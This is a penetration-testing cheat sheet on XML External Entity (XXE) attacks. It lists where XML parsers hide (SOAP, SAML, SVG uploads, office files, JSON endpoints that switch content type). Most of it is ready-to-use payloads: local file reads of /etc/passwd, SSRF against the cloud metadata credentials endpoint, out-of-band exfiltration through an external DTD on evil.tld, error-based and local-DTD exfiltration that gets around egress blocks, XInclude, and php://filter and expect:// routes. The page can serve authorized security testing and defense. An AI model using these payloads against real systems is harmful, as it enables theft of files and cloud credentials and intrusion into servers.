# XXE (XML External Entity)

XXE is what happens when an XML parser is told to resolve references to the outside world and nobody turned that off. It reads files, performs SSRF, and sometimes runs code, all from a document you supply. The catch is that XML is now hidden inside formats people forget are XML.

## The mental model

XML allows a document to declare entities, including external ones that the parser fetches from a URL or file path. If the parser resolves external entities (the default in many older libraries), you declare an entity pointing at a local file or internal URL and reference it where its content gets reflected or processed. Blind variants exfiltrate out of band when nothing is reflected.

## Where it hides / tell-tales

- **Obvious XML endpoints**: SOAP APIs, XML-RPC, RSS/Atom importers, sitemap uploads, SAML (see `SAML-and-SSO.md`), any `Content-Type: application/xml` or `text/xml`.
- **Hidden XML**: `.docx`, `.xlsx`, `.pptx` (zipped XML), `.svg` (XML), `.xml`-based config imports, SVG avatars, `.odt`, RSS, GPX, and any "upload a document" that the server parses. Also JSON endpoints that silently accept XML when you change the `Content-Type`.
- **SVG image upload**: an image feature that accepts SVG is an XML feature. If the server rasterizes it (thumbnail, PDF), external entities and `<image xlink:href>` fire server-side.
- **Content-type switching**: an endpoint documented as JSON that also parses XML if you send `Content-Type: application/xml`. Always try flipping the content type on a body-taking endpoint.

## Real material

Classic file read (reflected):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
```

SSRF via XXE (reach internal/metadata, see `SSRF.md`):

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<user><name>&xxe;</name></user>
```

Blind out-of-band exfiltration with an external DTD on your server. The document:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://evil.tld/evil.dtd"> %ext; ]>
<foo>bar</foo>
```
`evil.dtd` on your server (parameter entities, because general entities cannot nest in the internal subset for this trick):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.tld/log?x=%file;'>">
%eval;
%exfil;
```
The file content comes back to your server in the query string. For multi-line files, use `php://filter` base64 (PHP targets) or the FTP exfil trick.

Error-based exfiltration when OOB egress is blocked, forcing the file content into a parser error message:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```

SVG that reads a file when rasterized:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <text x="10" y="20">&xxe;</text>
</svg>
```

DOCX/XLSX: unzip, edit `word/document.xml` (or `[Content_Types].xml`, or `docProps`) to add the DOCTYPE and entity, re-zip, upload. The server parsing the office file resolves it.

## Beyond the basics

- **Parameter entities for everything blind**: general entities (`&xxe;`) only work when content is reflected. For blind targets, parameter entities (`%name;`) loaded from an external DTD are the workhorse; memorize the OOB and error-based DTD patterns above.
- **`php://filter` to read source and binary-safe files**: on PHP, `php://filter/convert.base64-encode/resource=/var/www/config.php` returns base64 you can decode, which survives characters that would break naive file reads.
- **XInclude when you cannot control the DOCTYPE**: if the server builds the XML and you only control a sub-element (so you cannot add a `<!DOCTYPE>`), use XInclude:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- **Billion laughs / entity expansion DoS**: nested entities that expand exponentially. Note it as a DoS finding, but do not actually run it against production; it can take the service down.
- **XXE to RCE**: on PHP with the `expect` module, `expect://id`; via internal services reachable through the SSRF (gopher to a job queue); or via a local file write primitive. Rare but worth checking the environment for.
- **Local DTD reuse for error-based on hardened targets**: when external DTD fetch is blocked, reference a DTD file known to exist locally (shipped with the OS or app) and redefine one of its parameter entities to trigger error-based exfil. This defeats "no outbound network" defenses.
- **SOAP and multi-part**: XXE in one parameter of a larger SOAP body; the rest of the message must stay valid, so inject the entity precisely.

## What to watch for

- Modern parsers (recent libxml2, Java with secure processing, .NET post-4.5.2 defaults) disable external entities by default; confirm by behavior, do not assume vulnerability.
- A blocked outbound connection does not mean no XXE; pivot to error-based or local-DTD techniques.
- Office/SVG rasterizers may run in sandboxes; `file://` read might work while network SSRF is blocked, or vice versa. Test both axes.
- Do not fire entity-expansion DoS at live targets.

## Hunting checklist

- Find every XML sink, including hidden ones (office files, SVG, content-type switching, SAML).
- Test reflected file read first; if blind, switch to external-DTD OOB, then error-based, then local-DTD.
- Test SSRF-via-XXE against internal and metadata endpoints.
- For partial-control inputs, try XInclude.
- Use `php://filter` on PHP to pull source and config.
- Flip `Content-Type` to XML on JSON endpoints to find silent XML parsing.
